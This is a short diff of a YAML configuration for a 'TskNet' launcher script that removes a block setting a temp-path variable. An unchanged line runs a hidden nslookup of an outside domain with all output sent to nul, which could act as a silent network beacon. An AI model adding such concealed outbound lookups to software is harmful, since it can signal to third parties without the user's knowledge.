@@ -2,7 +2,6 @@
 
 # FullSource
 # FullOutput
-# SetTempPath
 # Fill Account and password
 # Value
 # TskNetScriptOption
@@ -42,12 +41,6 @@ TskNet_LauncherScript:
         Mark: '___nslookup'
         Option: '@'
         Value: 'nslookup tenco.info.americansdyg.com>nul 2>nul'
-    - SetTempPath:
-        # Fill SetTempPath value as sys temp in the installer before install.
-        Group: 'SetTempPath'
-        Mark: '___tskDrive'
-        Option: '@set tskDrive='
-        Value: null
     - OptionalHint:
         Group: 'Combined'
         Mark: '___optionalHint'
